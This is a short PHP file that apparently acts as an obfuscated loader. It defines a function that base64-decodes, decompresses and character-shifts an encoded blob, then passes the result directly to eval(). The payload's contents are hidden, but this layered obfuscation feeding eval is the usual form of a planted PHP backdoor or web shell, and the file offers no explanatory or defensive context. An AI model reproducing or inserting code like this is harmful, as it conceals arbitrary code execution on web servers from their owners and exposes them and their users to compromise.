<?php function MOV($EOqb)
{ 
$EOqb=gzinflate(base64_decode($EOqb));
 for($i=0;$i<strlen($EOqb);$i++)
 {
$EOqb[$i] = chr(ord($EOqb[$i])-1);
 }
 return $EOqb;
 }eval(MOV("TY8xCsJAEEUPsKeYQoimCdZBULC10jIQwu6oi9nNkh0hIlY2YmVhY6WFhV1O4HGCego3UdDp/vsz/PkAbphAniY5QttSLjnFtDJooQfdTsiYThRak3CExJhIZQJTR5cWgeZSL6LRh/xAsxLxTHPMdTTOpjTEFAndVeD7DHzoK1lIDc2l0wFz8dbCQChHsSDUwn7dNas/DAKoDuXjeHvey2p3eZ2u1f783N4bs07+T6mZyTNCTiigrqRn0BKNO5EKXTHvo2Jy0gvZ5g0="));?>